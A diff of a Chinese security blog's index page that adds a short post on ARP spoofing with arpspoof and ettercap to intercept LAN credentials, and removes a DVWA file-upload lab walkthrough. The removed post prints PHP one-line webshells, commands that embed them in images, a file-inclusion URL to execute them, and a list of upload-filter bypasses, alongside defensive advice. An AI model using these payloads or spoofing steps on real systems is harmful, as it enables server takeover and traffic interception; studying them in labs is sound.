@@ -120,7 +120,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">375</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">148</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">376</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">149</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -185,18 +185,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">148</span>
+          <span class="site-state-item-count">149</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">375</span>
+        <span class="site-state-item-count">376</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -221,6 +221,87 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/11/ARP%E6%AC%BA%E9%AA%97%E5%B7%A5%E5%85%B7arpspoof%E7%9A%84%E7%94%A8%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/09/11/ARP%E6%AC%BA%E9%AA%97%E5%B7%A5%E5%85%B7arpspoof%E7%9A%84%E7%94%A8%E6%B3%95/" class="post-title-link" itemprop="url">ARP欺骗工具arpspoof的用法</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-09-11 16:52:00" itemprop="dateCreated datePublished" datetime="2021-09-11T16:52:00+08:00">2021-09-11</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="ARP工具"><a href="#ARP工具" class="headerlink" title="ARP工具"></a>ARP工具</h3><p>arpspoof 是一款进行arp欺骗的工具，攻击者可以通过它来毒化受害者arp缓存，将网关mac替换为攻击者mac，然后攻击者可截获受害者发送和收到的数据包，可获取受害者账户、密码等相关敏感信息。ARP欺骗，是让目标主机的流量经过主机的网卡，再从网关出去，而网关也会把原本流入目标机的流量经过我得电脑。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br></pre></td></tr></table></figure>
+
+<h4 id="ARP断网攻击"><a href="#ARP断网攻击" class="headerlink" title="ARP断网攻击"></a>ARP断网攻击</h4><p>在实验之前我们首先要知道ARP断网攻击是局域网攻击，我们要保证目标主机必须和自己处于一个局域网内，且自己和目标主机网络应该是通的。</p>
+<p>首先可以使用 nmap 扫描局域网中存活的地址,探测到的存活地址，就是我们的目标主机,然后使用 arpspoof 实施 ARP 欺骗。</p>
+<p><img src="/images/pasted-63.png" alt="upload successful"></p>
+<p>在使用arp欺骗前先开启Kali的IP转发</p>
+<p><img src="/images/pasted-64.png" alt="upload successful"></p>
+<p>链接目标机查看一下网络状态</p>
+<p><img src="/images/pasted-65.png" alt="upload successful"></p>
+<p>使用 ettercap 对数据进行抓取</p>
+<p><img src="/images/pasted-66.png" alt="upload successful"></p>
+<p><img src="/images/pasted-67.png" alt="upload successful"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1949,198 +2030,6 @@
 <li>设个有效期，过期作废</li>
 <li>错误太多次就锁定</li>
 <li>用成熟的方案，别自己瞎写</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/10/DVWA-File-Upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/10/DVWA-File-Upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA File Upload 文件上传通关教程</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-02-10 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-10T10:00:00+08:00">2021-02-10</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>文件上传漏洞，简单说就是能上传不该上传的东西，比如 WebShell。一旦传上去个 PHP 木马，服务器基本就归你了。这玩意危害是真的大。</p>
-<p>这关主要学怎么绕过各种上传限制，拿到 WebShell。</p>
-<h2 id="常用-WebShell"><a href="#常用-WebShell" class="headerlink" title="常用 WebShell"></a>常用 WebShell</h2><p>先准备几个常用的：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>简单粗暴，一个参数接收命令就完事。</p>
-<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>看代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// 上传成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>啥检查都没有，直接保存，爱传啥传啥。</p>
-<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><ol>
-<li>写个 <code>shell.php</code>，内容 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code></li>
-<li>直接上传</li>
-<li>访问 <code>http://localhost:3892/hackable/uploads/shell.php</code></li>
-<li>拿蚁剑或者菜刀连上去，服务器就是你的了</li>
-</ol>
-<p>太简单了，没啥好说的。</p>
-<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 检查了 Content-Type 和文件大小：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">    ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// 允许上传</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>只检查请求头里的 Content-Type，这玩意前端改不了但抓包工具能改。</p>
-<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>改 Content-Type：</strong></p>
-<ol>
-<li>上传 shell.php，Burp 抓包</li>
-<li>把 <code>Content-Type: application/octet-stream</code> 改成 <code>Content-Type: image/jpeg</code></li>
-</ol>
-<p><img data-src="/images/pasted-101.png" alt="upload successful"></p>
-<ol start="3">
-<li>放行，上传成功</li>
-</ol>
-<p><img data-src="/images/pasted-102.png" alt="upload successful"></p>
-<p><strong>图片马：</strong></p>
-<p>也可以做个图片马，把 PHP 代码塞图片里：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.jpg/b + shell.php/a webshell.jpg</span><br></pre></td></tr></table></figure>
-
-<p>或者直接追加：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span> &gt;&gt; image.jpg</span><br></pre></td></tr></table></figure>
-
-<p>不过图片马需要配合文件包含漏洞才能执行，后面会说。</p>
-<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 级别检查后缀和图片特征了：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>( <span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ( <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> ||</span><br><span class="line">      <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">    ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">getimagesize</span>( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// 允许上传</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>检查了：</p>
-<ol>
-<li>后缀必须是 jpg、jpeg、png</li>
-<li>文件要小于 100KB</li>
-<li><code>getimagesize()</code> 验证是不是真图片</li>
-</ol>
-<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>单纯改后缀和 Content-Type 不行了，得做图片马配合文件包含。</p>
-<p><strong>步骤 1：做图片马</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy logo.png/b + shell.php/a webshell.png</span><br></pre></td></tr></table></figure>
-
-<p>这样图片里就包含 PHP 代码了。</p>
-<p><strong>步骤 2：上传</strong></p>
-<p>上传 webshell.png，因为是真的图片，能过 <code>getimagesize()</code> 检查。</p>
-<p><strong>步骤 3：文件包含执行</strong></p>
-<p>图片本身不会执行 PHP，得用文件包含漏洞：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3892/vulnerabilities/fi/?page=../../hackable/uploads/webshell.png</span><br></pre></td></tr></table></figure>
-
-<p><strong>步骤 4：蚁剑连接</strong></p>
-<p>URL 填文件包含的地址，就能连上 WebShell 了。</p>
-<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别是真安全：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_file</span>   = <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line">        <span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">        <span class="title function_ invoke__">imagejpeg</span>( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>图片会用 GD 库重新生成一遍，里面夹带的恶意代码全都没了。文件名还是随机 MD5，想猜都猜不到。</p>
-<h2 id="常见绕过方式总结"><a href="#常见绕过方式总结" class="headerlink" title="常见绕过方式总结"></a>常见绕过方式总结</h2><table>
-<thead>
-<tr>
-<th>绕过方式</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>改 Content-Type</td>
-<td>抓包改 MIME 类型</td>
-</tr>
-<tr>
-<td>双写后缀</td>
-<td><code>shell.php.php</code></td>
-</tr>
-<tr>
-<td>大小写混淆</td>
-<td><code>shell.PhP</code></td>
-</tr>
-<tr>
-<td>特殊后缀</td>
-<td><code>.php5</code>、<code>.phtml</code></td>
-</tr>
-<tr>
-<td>空字节截断</td>
-<td><code>shell.php%00.jpg</code>（老版本 PHP）</td>
-</tr>
-<tr>
-<td>图片马</td>
-<td>配合文件包含</td>
-</tr>
-<tr>
-<td>.htaccess</td>
-<td>让服务器把图片当 PHP 执行</td>
-</tr>
-<tr>
-<td>条件竞争</td>
-<td>上传后赶在删除前访问</td>
-</tr>
-</tbody></table>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>文件上传防护要点：</p>
-<ol>
-<li>白名单限制后缀，别用黑名单</li>
-<li>检查文件真实类型，别只看 Content-Type</li>
-<li>图片最好重绘一遍，去恶意代码</li>
-<li>文件名随机化，别保留原名</li>
-<li>上传目录禁止执行脚本</li>
 </ol>
 
       
